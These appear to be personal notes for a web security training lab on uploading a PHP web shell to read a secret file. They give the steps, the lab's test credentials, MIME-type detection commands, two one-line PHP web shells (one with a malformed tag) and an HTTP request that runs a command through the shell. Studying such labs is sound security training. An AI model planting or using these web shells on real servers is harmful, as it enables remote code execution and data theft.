# Lab: Remote code execution via web shell upload

## End goal: upload a basic PHP web shell and get the contents of the file /home/carlos/secret

Credentials: wiener:peter

1. Learn site functionality

2. Upload avatar 

3. Detect endpoint 

4. Creat payload in php

5. Upload it and get content of secret file

xdg-mime built-in utility to detetct MIME-type

xdg-mime query filetype some_file.ext

file --mime-type some_file.ext

-------------------------------------------
Additional shell

```php
<?php echo system($_GET['command']); ?>

<?php passthru($_GET['command'])>
```


HTTP-request
GET /example/exploit.php?command=id HTTP/1.1

